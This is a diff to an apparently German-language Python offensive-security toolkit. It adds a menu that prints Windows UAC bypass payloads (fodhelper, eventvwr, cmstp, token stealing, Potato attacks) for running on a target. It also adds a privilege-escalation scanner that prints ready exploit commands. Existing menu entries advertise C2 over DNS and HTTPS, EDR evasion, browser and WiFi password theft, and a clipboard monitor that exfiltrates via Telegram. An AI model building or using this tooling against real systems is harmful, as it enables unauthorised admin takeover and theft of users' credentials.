@@ -1686,6 +1686,7 @@ async def menu_c2():
     menu_item(" E", "🔮  Advanced Evasion Builder",       "⛔", "DLL Unhooking + Direct Syscalls + Sleep Obfuscation")
     menu_item(" D", "🌐  DNS C2 Tunneling",               "⛔", "C2 über DNS Port 53 — bypassed jede Firewall")
     menu_item(" S", "🔐  HTTPS Shell (Port 443)",         "⛔", "Sieht aus wie HTTPS — bypassed Firewalls + IDS")
+    menu_item(" U", "🔓  UAC Bypass Suite",               "⛔", "7 Methoden: fodhelper/eventvwr/sdclt/cmstp/Potato")
     print()
     menu_item(" 0", "← Zurück", "")
     print()
@@ -2231,6 +2232,102 @@ async def menu_c2():
         if build.lower() in ("j", "y"):
             print()
             await run_tool_live(build_https_exe(lhost, lport, platform))
+        elif choice == "u":
+            banner(); section("🔓  UAC BYPASS SUITE", "7 Methoden — Registry · COM · Token · Potato")
+            info_box([
+                "UAC (User Account Control) verhindert unerlaubte Admin-Aktionen.",
+                "Diese Techniken umgehen UAC ohne den Benutzer um Erlaubnis zu fragen.",
+                "",
+                "Voraussetzung: du hast bereits eine Shell als normaler User",
+                "Ziel: Shell als Admin / SYSTEM ohne UAC-Prompt",
+                "",
+                "Der UAC-Check zeigt welche Methode auf dem Ziel-System funktioniert.",
+            ])
+            print()
+            print(f"  {C}[1]{R} UAC Level prüfen + passende Methode empfehlen")
+            print(f"  {C}[2]{R} fodhelper (Win10/11)")
+            print(f"  {C}[3]{R} eventvwr (Win7-10)")
+            print(f"  {C}[4]{R} sdclt (Win10)")
+            print(f"  {C}[5]{R} computerdefaults (Win10 1803+)")
+            print(f"  {C}[6]{R} cmstp (Win7-11, sehr zuverlässig)")
+            print(f"  {C}[7]{R} Token Steal: Admin → SYSTEM")
+            print(f"  {C}[8]{R} Juicy/PrintSpoofer (SeImpersonatePrivilege)")
+            print()
+            sub = prompt("uac")
+            if sub in ("", "0"):
+                wait_key(); continue
+
+            from tools.c2.uac_bypass import (
+                uac_check_ps1, uac_fodhelper, uac_eventvwr, uac_sdclt,
+                uac_computerdefaults, uac_cmstp, uac_token_steal, uac_juicy_potato
+            )
+
+            if sub == "1":
+                banner(); section("🔍  UAC CHECK", "Level prüfen + Methode empfehlen")
+                print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
+                print(f"  {C}{uac_check_ps1()}{R}")
+
+            else:
+                payload = ask("Payload / Befehl (z.B. cmd.exe oder Pfad zur Reverse Shell)", "cmd.exe")
+                kali_ip = ask("Kali IP (für Juicy/cmstp)", "10.10.10.1")
+                print()
+
+                if sub == "2":
+                    banner(); section("🔓  FODHELPER UAC BYPASS", "Win10/11")
+                    print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
+                    print(f"  {C}{uac_fodhelper(payload)}{R}")
+
+                elif sub == "3":
+                    banner(); section("🔓  EVENTVWR UAC BYPASS", "Win7-10")
+                    print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
+                    print(f"  {C}{uac_eventvwr(payload)}{R}")
+
+                elif sub == "4":
+                    banner(); section("🔓  SDCLT UAC BYPASS", "Win10")
+                    print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
+                    print(f"  {C}{uac_sdclt(payload)}{R}")
+
+                elif sub == "5":
+                    banner(); section("🔓  COMPUTERDEFAULTS UAC BYPASS", "Win10 1803+")
+                    print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
+                    print(f"  {C}{uac_computerdefaults(payload)}{R}")
+
+                elif sub == "6":
+                    banner(); section("🔓  CMSTP UAC BYPASS", "Win7-11 — sehr zuverlässig")
+                    info_box([
+                        "cmstp = Connection Manager Profile Installer",
+                        "Nutzt INF-Datei + AutoElevate COM-Interface.",
+                        "Kein direkter Registry-Eintrag → oft unentdeckt.",
+                    ])
+                    _, ps1 = uac_cmstp(payload, kali_ip)
+                    print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
+                    print(f"  {C}{ps1}{R}")
+
+                elif sub == "7":
+                    banner(); section("🔓  TOKEN STEAL: Admin → SYSTEM", "winlogon Token")
+                    info_box([
+                        "Stiehlt den SYSTEM-Token von winlogon.exe.",
+                        "Voraussetzung: bereits im Admin-Kontext (elevated).",
+                        "Ergebnis: whoami → NT AUTHORITY\\SYSTEM",
+                        "Danach: SAM-Dump, Credential-Dump ohne Einschränkungen.",
+                    ])
+                    print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
+                    print(f"  {C}{uac_token_steal()}{R}")
+
+                elif sub == "8":
+                    banner(); section("🔓  JUICY / PRINTSPOOFER", "SeImpersonatePrivilege → SYSTEM")
+                    info_box([
+                        "Funktioniert wenn whoami /priv zeigt:",
+                        "  SeImpersonatePrivilege   Aktiviert",
+                        "",
+                        "Häufig bei: IIS App-Pool, SQL Server, Service-Accounts.",
+                        "Win10 1809+: PrintSpoofer statt JuicyPotato.",
+                    ])
+                    print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
+                    print(f"  {C}{uac_juicy_potato(payload, kali_ip)}{R}")
+
+            wait_key()
+
         wait_key()
 
 
@@ -3078,6 +3175,8 @@ async def menu_postexploit():
         menu_item(" B", "🌐  Browser Passwörter",         "⛔", "Chrome/Edge/Firefox Login-Daten via DPAPI")
         menu_item(" I", "📶  WiFi Passwörter",            "🔴", "Alle gespeicherten WLAN-Keys via netsh")
         menu_item(" C", "📋  Clipboard Monitor",          "🔴", "Zwischenablage überwachen — Tokens/Passwörter")
+        print()
+        menu_item(" A", "🔍  Auto-PrivEsc Scanner",       "⛔", "15+ Vektoren prüfen + fertige Exploit-Befehle")
         menu_item(" 0", "← Zurück", "")
 
         choice = prompt("postexploit")
@@ -3354,6 +3453,39 @@ async def menu_postexploit():
             ps1 = clipboard_monitor_ps1(save_path, duration, tg_token, tg_chat)
             print(f"  {G}[+] Clipboard-Monitor PS1 — auf Ziel ausführen:{R}\n")
             print(f"  {C}{ps1}{R}")
+
+        elif choice == "a":
+            banner(); section("🔍  AUTO-PRIVESC SCANNER", "15+ Vektoren — fertige Exploit-Befehle")
+            info_box([
+                "Generiert ein PS1-Script das auf dem Ziel-Windows läuft und prüft:",
+                "",
+                "  AlwaysInstallElevated · Unquoted Service Paths",
+                "  Weak Service Permissions · Weak Registry Permissions",
+                "  Writeable PATH Dirs (DLL Hijacking) · UAC Level",
+                "  SeImpersonatePrivilege (Potato) · SeBackupPrivilege",
+                "  SeDebugPrivilege · PrintNightmare · Scheduled Tasks",
+                "  AutoRuns · Stored Credentials · WSL Escape",
+                "",
+                "Für jeden gefundenen Vektor: fertiger Exploit-Befehl direkt angezeigt.",
+            ])
+            print()
+            report_path = ask("Report-Datei auf Ziel", "C:\\Windows\\Temp\\privesc.txt")
+            kali_ip = ask("Kali IP (für Hinweise, optional)", "")
+            print()
+            print(f"  {Y}[→] Quick-Check (sofort, One-Liner):{R}")
+            from tools.c2.privesc_scanner import generate_scanner_ps1, quick_check_ps1
+            print(f"  {C}{quick_check_ps1()}{R}")
+            print()
+            show_full = ask("Vollständigen Scanner anzeigen? [j/n]", "j")
+            if show_full.lower() == "j":
+                print(f"\n  {G}[+] Vollständiger Auto-PrivEsc Scanner PS1:{R}\n")
+                ps1 = generate_scanner_ps1(kali_ip, report_path)
+                # Ausgabe in Blöcken damit Terminal nicht überläuft
+                lines = ps1.split("\n")
+                for line in lines:
+                    print(f"  {C}{line}{R}")
+            print(f"\n  {DIM}Tipp: Skript in PowerShell ISE einfügen und mit F5 starten.{R}")
+            print(f"  {DIM}Oder als Datei: 'skript.ps1' → powershell -ep bypass ./skript.ps1{R}")
 
         wait_key()
 
